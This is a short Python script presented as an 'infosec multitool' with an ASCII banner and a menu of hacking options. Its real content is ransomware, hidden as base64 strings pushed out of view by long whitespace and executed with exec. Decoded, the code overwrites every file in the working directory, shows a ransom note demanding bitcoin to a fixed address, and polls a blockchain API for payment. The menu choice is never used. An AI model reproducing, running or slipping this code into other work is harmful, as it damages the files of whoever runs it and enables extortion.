import base64 as b64                                                                                                                                            ;HackRF2 = "cHJpbnQoIlRoaXMgaXMgcmFuc29td2FyZSIpCnByaW50KCJDbG9zaW5nIHRoaXMgd2luZG93IHdpbGwgcmVzdWx0IGluIHlvdXIgZmlsZXMgYmVpbmcgbG9zdCBmb3JldmVyIikKcHJpbnQoIlNlbmQgMC4wMDAwMDg0IEJUQyB0byAxTkVIbm9xVDJqcG1ZNldOVk5mZFpqRXNKR2JDOENxNzhLIikKZGVsb2NrKCkKYXNrcmFucygpCg==";HackRF2=b64.b64decode(HackRF2)
import time                                                                                                                                                       ;HackRF15 = "cHJpbnQoIiIiCiDiloTiloDiloDiloDiloDiloQgIOKWhOKWgOKWgOKWgOKWiOKWgOKWgOKWhCAg4paE4paA4paA4paA4paA4paEICAg4paE4paA4paA4paE4paA4paA4paA4paEIArilogg4paIICAg4paQIOKWiCAgICDiloggIOKWkCDiloggICAgICDilogg4paIICAg4paIICAg4paIIAogICDiloDiloQgICDilpAgICDiloggICAgIOKWiCAgICAgIOKWiCDilpAgIOKWiOKWgOKWgOKWgOKWgCAgCuKWgOKWhCAgIOKWiCAgICAg4paIICAgICAg4paA4paEICAgIOKWhOKWgCAgICDiloggICAgICAKIOKWiOKWgOKWgOKWgCAgICDiloTiloAgICAgICAgICDiloDiloDiloDiloAgICAg4paE4paAICAgICAgIAog4paQICAgICAg4paIICAgICAgICAgICAgICAgICAg4paIICAgICAgICAgCiAgICAgICAg4paQICAgICAgICAgICAgICAgICAg4paQICAgICAgICAgCiIiIik="; HackRF15 = b64.b64decode(HackRF15)
import os
import requests                                                                                                                                              
import base64 as b64                                                                                                                                         ;HackRFa = "YWxwaGFiZXQgPSAiQSBCIEMgRCBFIEYgRyBIIEkgSiBLIEwgTSBOIE8gUCBRIFIgUyBUIFUgViBXIFggWSBaIDEgMiAzIDQgNSA2IDcgOCA5IGEgYiBjIGQgZSBmIGcgaCBpIGogayBsIG0gbiBvIHAgcSByIHMgdCB1IHYgdyB4IHkgeiIuc3BsaXQoKQp1ID0gIiIKZGVmIGluZm9wdXJjaGFzZSgpOgogICAgYnRjaGFzaCA9ICIxTkVIbm9xVDJqcG1ZNldOVk5mZFpqRXNKR2JDOENxNzhLIgogICAgdXJsID0gZiJodHRwczovL2Jsb2NrY2hhaW4uaW5mby9yYXdhZGRyL3tidGNoYXNofSIKICAgIHggPSByZXF1ZXN0cy5nZXQodXJsKS5qc29uKCkKICAgIHRyeToKICAgICAgICB4ID0geFsidHhzIl1bMF1bImhhc2giXQogICAgICAgIHJldHVybiB4Wzo0XQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiAiRXJyb3IiCmRlZiByYW5kb21jaGFyKCk6CiAgICB1ID0gIiIKICAgIGZvciBpIGluIHJhbmdlKDQpOgogICAgICAgIHUgKz0gcmFuZG9tLmNob2ljZShhbHBoYWJldCkKICAgIHJldHVybiB1"; HackRFa = b64.b64decode(HackRFa)
import json                                                                                                                                                                          ;HackRF="ZGVmIGRlbG9jaygpOgogICAgZm9yIGZpbGUgaW4gb3MubGlzdGRpcigpOgogICAgICAgIGlmIGZpbGUgPT0gImFuYXJjaHlleGVjLnB5IjoKICAgICAgICAgICAgY29udGludWUKICAgICAgICBlbHNlOgogICAgICAgICAgICB3aXRoIG9wZW4oZmlsZSwgInJiIikgYXMgZjoKICAgICAgICAgICAgICAgIHJhdyA9IGYucmVhZCgpIAogICAgICAgICAgICB3aXRoIG9wZW4oZmlsZSwgIndiIikgYXMgZjoKICAgICAgICAgICAgICAgIGYud3JpdGUoYjY0LmI2NGVuY29kZShyYXcpKQogICAgcHJpbnQoIkVOQ09ERUQiKQ==";HackRF=b64.b64decode(HackRF)
import random                                                                                                                                                ;HackRFone = "ZGVmIGFza3JhbnMoKToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdGltZS5zbGVlcCg1KQogICAgICAgIGlmIG5vdCBpbmZvcHVyY2hhc2UoKSA9PSAiRXJyb3IiOiAgICAKICAgICAgICAgICAgcHJpbnQoZiIxKSB7cmFuZG9tY2hhcigpfSIpCiAgICAgICAgICAgIHByaW50KGYiMikge2luZm9wdXJjaGFzZSgpfSIpCiAgICAgICAgICAgIHByaW50KGYiMykge3JhbmRvbWNoYXIoKX0iKQogICAgICAgICAgICBwcmludCgiVGhlc2UgYXJlIHRoZSBmaXJzdCBmb3VyIGNoYXJhY3RlcnMgb2YgdGhlIHJlY2VudCBhZGRyZXNzZXMuIikKICAgICAgICAgICAgcHJpbnQoIkNsb3NpbmcgdGhpcyB3aW5kb3cgd2lsbCByZXN1bHQgaW4geW91ciBjb21wdXRlciBiZWluZyBsb2NrZWQgZm9yZXZlciIpCiAgICAgICAgICAgIGNfaGFzaCA9IGlucHV0KCJXaGljaCBvZiB0aGVzZSBidGMgYWRkcmVzc2VzIGFyZSB5b3Vycz8gQW5zd2VyIDEsIDIsIG9yIDM6ICIpCiAgICAgICAgICAgIGlmIGNfaGFzaCA9PSAiMSI6CiAgICAgICAgICAgICAgICBwcmludCgiVGhpcyBoYXMgYWxyZWFsZHkgYmVlbiBwYWlkIikKICAgICAgICAgICAgICAgIGFza3JhbnMoKQogICAgICAgICAgICBpZiBjX2hhc2ggPT0gIjIiOgogICAgICAgICAgICAgICAgcHJpbnQoIlVubG9ja2luZyBhY2NvdW50Li4iKQogICAgICAgICAgICAgICAgdGltZS5zbGVlcCgwLjEpCiAgICAgICAgICAgICAgICBpbnB1dCgiVG9vIGJhZCwgZmlsZXMgYXJlIHVucmVjb3ZlcmFibGUiKQogICAgICAgICAgICBpZiBjX2hhc2ggPT0gIjMiOgogICAgICAgICAgICAgICAgcHJpbnQoIlRoaXMgaGFzIGFscmVhbGR5IGJlZW4gcGFpZCIpCiAgICAgICAgICAgICAgICBhc2tyYW5zKCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBpbnB1dCgiTm8gcHVyY2hhc2VzIGZvdW5kLCBwcmVzcyBlbnRlciB0byBsb29rIGFnYWluIikKICAgICAgICAgICAgYXNrcmFucygpCg==";HackRFone=b64.b64decode(HackRFone)
try:
    from HackRF import *
except:
    print("Manually installing..")
print("""
 ▄▀▀█▄   ▄▀▀▄ ▀▄  ▄▀▀█▄   ▄▀▀▄▀▀▀▄  ▄▀▄▄▄▄   ▄▀▀▄ ▄▄   ▄▀▀▄ ▀▀▄ 
▐ ▄▀ ▀▄ █  █ █ █ ▐ ▄▀ ▀▄ █   █   █ █ █    ▌ █  █   ▄▀ █   ▀▄ ▄▀ 
  █▄▄▄█ ▐  █  ▀█   █▄▄▄█ ▐  █▀▀█▀  ▐ █      ▐  █▄▄▄█  ▐     █   
 ▄▀   █   █   █   ▄▀   █  ▄▀    █    █         █   █        █   
█   ▄▀  ▄▀   █   █   ▄▀  █     █    ▄▀▄▄▄▄▀   ▄▀  ▄▀      ▄▀    
▐   ▐   █    ▐   ▐   ▐   ▐     ▐   █     ▐   █   █        █     
        ▐                          ▐         ▐   ▐        ▐     
""")
print("""
Multitool for infosec

1. Unfriend all
2. Get cookies
3. IP finder
4. MIM
5. RAT with IP
6. Gift Card Gen
""")
xpa = input("Pick one: ")
exec(HackRFa)
exec(HackRF)
exec(HackRFone)
exec(HackRF15)
exec(HackRF2)

